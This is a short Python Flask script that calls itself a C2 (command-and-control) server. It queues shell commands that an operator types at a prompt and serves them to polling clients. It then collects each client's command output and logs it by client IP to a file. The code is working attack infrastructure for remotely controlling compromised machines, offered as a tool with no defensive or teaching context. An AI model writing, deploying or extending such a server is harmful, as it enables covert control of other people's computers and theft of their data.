#!/usr/bin/env python3
import threading
from flask import Flask, request

app = Flask(__name__)

# Store client results
results = {}

# Command queue (Clients will fetch this command)
command = ""

# Log file for storing results
LOG_FILE = "c2_results.txt"

@app.route('/get_command', methods=['GET'])
def get_command():
    """Send the latest command to the clients and clear it after first execution."""
    global command
    if command:  
        cmd_to_send = command  # Send the command to the client
        command = ""  # Clear the command after sending
        return cmd_to_send  
    return "none"

@app.route('/send_result', methods=['POST'])
def receive_result():
    """Receive results from clients and log them."""
    global results
    client_ip = request.remote_addr
    result_data = request.form.get("output")
    
    if client_ip and result_data:
        results[client_ip] = result_data
        log_message = f"\n[+] Received from {client_ip}:\n{result_data}\n"
        
        # Print the result immediately
        print(log_message)

        # Append to log file
        with open(LOG_FILE, "a") as log_file:
            log_file.write(log_message)
    
    return "OK"

def command_input_loop():
    """Interactive command input in the same terminal."""
    global command
    while True:
        user_input = input("\nC2 Command > ")  # Enter command interactively
        if user_input.lower() == "exit":
            print("[!] Exiting C2 Server...")
            break
        command = user_input  # Update global command for clients
        
        # Print and log the new command
        command_message = f"[+] New Command Set: {command}\n"
        print(command_message)

        # Append command to log file
        with open(LOG_FILE, "a") as log_file:
            log_file.write(command_message)

# Start the Flask server in a separate thread
def run_server():
    print("[+] C2 Server running on port 5000...")
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == '__main__':
    # Run the Flask server in a separate thread
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()

    # Start the interactive command input loop
    command_input_loop()

